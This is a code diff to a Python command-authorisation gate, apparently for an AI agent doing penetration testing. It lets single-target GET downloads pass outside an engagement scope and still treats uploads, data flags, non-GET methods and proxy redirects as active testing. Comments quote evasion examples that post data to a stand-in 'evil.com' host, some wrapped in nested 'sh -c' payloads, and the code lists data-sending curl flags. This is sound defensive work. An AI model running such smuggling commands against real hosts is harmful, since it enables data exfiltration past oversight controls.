@@ -1226,6 +1226,117 @@ def _window_open(state: Dict[str, Any], now: Optional[datetime] = None
     return True, ""
 
 
+# ── DOWNLOADING IS NOT ACTIVE TESTING ────────────────────────────────
+# curl and wget are in _NETWORK_TOOLS because they reach arbitrary hosts, and
+# for a POST payload or a traversal probe that is exactly right. The same
+# membership also meant that with no engagement recorded — a general assistant
+# or coding session, which has no engagement and never will — every download
+# on the box failed closed:
+#
+#     curl -fsSL https://astral.sh/uv/install.sh -o /tmp/i.sh   -> REFUSED
+#     wget https://files.pythonhosted.org/.../requests.tar.gz   -> REFUSED
+#
+# and the only remedies on offer were to scope_set every software mirror on the
+# internet or to cut the gate out of gate_command entirely. This module already
+# names what that costs, in the `-f` note above: "a gate that refuses ordinary
+# work is a gate the operator switches off, and then it protects nothing at
+# all — so the false-refusal cost here is a SECURITY cost, not a convenience
+# one."
+#
+# It is also INCONSISTENT, which is what settles it: tool_web_read in
+# basilisk_core fetches any URL the model names and has never been scope-gated.
+# Refusing a GET here removed no capability the model lacked by another name —
+# only the ability to save the bytes to a file.
+#
+# THE CARVE-OUT IS ONE SHAPE AND NOTHING MORE: exactly one target, GET/HEAD, no
+# body, no upload, no fuzzing. Everything else stays inside the boundary, and
+# the narrowness is bought by the hardened extractor rather than a second
+# regex:
+#   * a body, form, upload or non-GET method   -> active (flag scan below)
+#   * `--resolve`/`--connect-to`/`--proxy`     -> the extractor harvests the
+#     redirect endpoint as a SECOND target, so the count rule catches the
+#     laundering with no flag list of its own
+#   * `curl -i evil.com https://acme.com`      -> two targets, likewise
+#   * anything unpinnable                      -> `uncertain` keeps its refusal
+#
+# EXCLUSIONS STILL BITE. An RoE carve-out ("10.0.0.0/8 except the DC") says do
+# not touch that host AT ALL, and a GET touches it. So a retrieval whose target
+# is on the exclusion list falls through to the normal refusal below. That is
+# the one part of this boundary that protects someone other than the operator,
+# and it is cheap to keep.
+_FETCH_TOOLS: Set[str] = {"curl", "wget", "wget2", "aria2c", "axel"}
+
+_SENDS_DATA_FLAGS: Set[str] = {
+    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
+    "--data-ascii", "--json", "-F", "--form", "--form-string",
+    "-T", "--upload-file", "--post-data", "--post-file", "--body-data",
+    "--body-file", "--path-as-is",
+}
+_NON_RETRIEVAL_METHODS: Set[str] = {
+    "post", "put", "patch", "delete", "trace", "connect", "options",
+}
+# `[1-100]` / `{a,b}` in a URL — curl expands these into many requests, which
+# is enumeration, not retrieval.
+_URL_GLOB_RE = re.compile(r"https?://[^\s'\"]*(?:\[[^\]\s]*[-:][^\]\s]*\]"
+                          r"|\{[^}\s]*,[^}\s]*\})")
+
+
+def _retrieval_tokens(command: str, _depth: int = 0) -> List[str]:
+    """Every token in `command`, INCLUDING those inside a quoted sub-payload.
+
+    The flag scan has to see as deep as the extractor does. `_argv` hands back
+    `bash -c "curl -d x=1 https://evil.com"` as three tokens, the third being
+    the whole payload as ONE string — so a scan of that list finds no `-d`, and
+    an upload wrapped in `sh -c` read as a plain download while the extractor
+    had correctly attributed the curl. Re-tokenise any token that still
+    contains whitespace, which is what a quoted payload looks like after one
+    pass, and recurse for the nested `sh -c 'sh -c "…"'` case.
+    """
+    toks = _argv(command) or []
+    if _depth > 4:
+        return toks
+    out: List[str] = []
+    for t in toks:
+        out.append(t)
+        if t and (" " in t or "\t" in t):
+            out.extend(_retrieval_tokens(t, _depth + 1))
+    return out
+
+
+def _is_retrieval_only(command: str, ext: "Extraction") -> bool:
+    """True for a single-target GET fetch and nothing else."""
+    tools = set(ext.tools)
+    if not tools or not tools.issubset(_FETCH_TOOLS):
+        return False
+    if ext.uncertain:
+        return False
+    if len(set(ext.targets)) != 1:
+        return False
+    if _URL_GLOB_RE.search(command or ""):
+        return False
+    toks = _retrieval_tokens(command)
+    for i, tok in enumerate(toks):
+        flag, _, inline = tok.partition("=")
+        # SHORT FLAGS ARE CASE-SENSITIVE. Folding first made `-T` (upload-file)
+        # compare equal to `-t` (--telnet-option) and `-F` (form) to `-f`
+        # (--fail), so an upload read as a plain download. Fold long only.
+        key = flag.lower() if flag.startswith("--") else flag
+        if key in _SENDS_DATA_FLAGS:
+            return False
+        # Combined curl shorts: `-sd name=x` carries data, `-fsSL` does not.
+        if (len(flag) > 2 and flag[0] == "-" and flag[1] != "-"
+                and any(c in flag[1:] for c in "dFT")):
+            return False
+        if key in ("-X", "--request", "--method"):
+            val = inline or (toks[i + 1] if i + 1 < len(toks) else "")
+            if val.strip().strip("'\"").lower() in _NON_RETRIEVAL_METHODS:
+                return False
+        if flag.startswith("-X") and len(flag) > 2:
+            if flag[2:].strip("'\"").lower() in _NON_RETRIEVAL_METHODS:
+                return False
+    return True
+
+
 def check_command(command: str, state: Optional[Dict[str, Any]] = None,
                   now: Optional[datetime] = None) -> Dict[str, Any]:
     """The authorisation decision for one command.  FAILS CLOSED.
@@ -1246,6 +1357,26 @@ def check_command(command: str, state: Optional[Dict[str, Any]] = None,
     exclusions = [str(s).strip().lower() for s in
                   (state.get("exclusions") or []) if str(s).strip()]
     allow_loopback = state.get("allow_loopback", True)
+
+    # ── A DOWNLOAD IS NOT A TEST (see the note above _FETCH_TOOLS) ───
+    # Checked BEFORE the window and the scope list, because neither applies to
+    # fetching a tarball — but AFTER exclusions are in hand, so an RoE carve-out
+    # still refuses even a plain GET. If the target is excluded this falls
+    # through and the ordinary `failure="excluded"` refusal below answers it.
+    if _is_retrieval_only(command, ext):
+        _rtargets = sorted(set(ext.targets))
+        if not [t for t in _rtargets
+                if any(_touches_rule(t, r) for r in exclusions)]:
+            verdict["active"] = False
+            verdict["retrieval"] = True
+            verdict["targets"] = _rtargets
+            verdict["reason"] = (
+                "single-target GET retrieval (a download) — not active "
+                "testing, so the engagement boundary is not engaged. A "
+                "request body, an upload, a non-GET method, a URL glob, a "
+                "proxy/resolve redirect, a second target, or a target on the "
+                "exclusion list all make it active again.")
+            return verdict
 
     ok, why = _window_open(state, now)
     if not ok:
